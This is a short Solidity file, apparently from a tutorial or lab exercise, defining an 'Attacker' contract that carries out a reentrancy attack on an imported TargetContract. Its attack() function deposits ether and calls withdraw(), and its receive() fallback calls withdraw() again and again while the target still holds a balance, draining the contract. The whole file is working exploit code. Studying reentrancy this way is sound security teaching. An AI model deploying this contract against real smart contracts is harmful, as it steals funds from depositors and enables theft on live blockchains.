// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./TargetContract.sol";

contract Attacker {
    TargetContract public targetContract;
    
    constructor(address _targetContractAddress) {
        targetContract = TargetContract(_targetContractAddress);
    }

    //withdraw functio will trigger receive, this makes the attack
    receive() external payable {
        if(address(targetContract).balance > 0) {
            targetContract.withdraw();
        }
    }
    //the entrance of attack
    function attack() public payable {
        targetContract.deposite{value: msg.value}();
        targetContract.withdraw();
    }
}